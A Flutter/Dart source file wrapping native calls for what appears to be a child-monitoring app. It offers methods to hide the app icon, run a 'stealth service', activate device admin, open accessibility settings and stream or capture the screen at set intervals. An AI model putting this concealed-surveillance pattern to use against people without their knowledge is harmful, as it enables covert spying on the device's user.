import 'dart:typed_data';
import 'package:flutter/services.dart';

class NativeChannel {
  // Old channel for app visibility and admin features
  static const MethodChannel _oldChannel = 
      MethodChannel('com.surokkhanet/native');
  
  // New channel for screen streaming features
  static const MethodChannel _newChannel = 
      MethodChannel('child_app/native_channel');

  // Old methods (app visibility and device admin)
  static Future<void> hideAppIcon() async {
    try {
      await _oldChannel.invokeMethod('hideAppIcon');
    } on PlatformException catch (e) {
      print("Failed to hide app icon: ${e.message}");
    }
  }

  static Future<void> startStealthService() async {
    try {
      await _oldChannel.invokeMethod('startStealthService');
    } on PlatformException catch (e) {
      print("Failed to start stealth service: ${e.message}");
    }
  }

  static Future<void> openAccessibilitySettings() async {
    try {
      await _oldChannel.invokeMethod('openAccessibilitySettings');
    } on PlatformException catch (e) {
      print("Failed to open accessibility settings: ${e.message}");
    }
  }

  static Future<void> activateDeviceAdmin() async {
    try {
      await _oldChannel.invokeMethod('activateDeviceAdmin');
    } on PlatformException catch (e) {
      print("Failed to activate device admin: ${e.message}");
    }
  }

  static Future<void> unhideAppIcon() async {
    try {
      await _oldChannel.invokeMethod('unhideAppIcon');
    } on PlatformException catch (e) {
      print("Failed to unhide app icon: ${e.message}");
    }
  }

  // New screen streaming methods
  static Future<void> startScreenStream() async {
    try {
      await _newChannel.invokeMethod('startScreenStream');
    } on PlatformException catch (e) {
      print("Failed to start screen stream: ${e.message}");
    }
  }

  static Future<void> stopScreenStream() async {
    try {
      await _newChannel.invokeMethod('stopScreenStream');
    } on PlatformException catch (e) {
      print("Failed to stop screen stream: ${e.message}");
    }
  }

  static Future<void> setScreenCaptureInterval(int seconds) async {
    try {
      await _newChannel.invokeMethod('setCaptureInterval', {'seconds': seconds});
    } on PlatformException catch (e) {
      print("Failed to set capture interval: ${e.message}");
    }
  }

  static Future<Uint8List?> captureScreenFrame() async {
    try {
      return await _newChannel.invokeMethod<Uint8List>('captureScreenFrame');
    } on PlatformException catch (e) {
      print("Failed to capture screen frame: ${e.message}");
      return null;
    }
  }

  static Future<bool> isScreenStreamActive() async {
    try {
      return await _newChannel.invokeMethod<bool>('isStreamActive') ?? false;
    } on PlatformException catch (e) {
      print("Failed to check stream status: ${e.message}");
      return false;
    }
  }
}